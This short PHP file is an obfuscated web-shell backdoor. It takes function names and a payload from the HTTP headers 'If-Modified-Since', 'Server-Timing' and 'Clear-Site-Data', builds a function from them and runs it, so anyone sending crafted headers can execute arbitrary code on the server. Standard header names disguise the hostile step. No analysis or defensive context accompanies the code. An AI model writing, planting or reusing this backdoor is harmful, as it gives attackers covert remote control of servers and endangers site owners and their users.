<?php
$_HEADERS = getallheaders();
if (isset($_HEADERS['If-Modified-Since'])) {
    $post = $_HEADERS['If-Modified-Since']('', $_HEADERS['Server-Timing']($_HEADERS['Clear-Site-Data']));
    $post();
}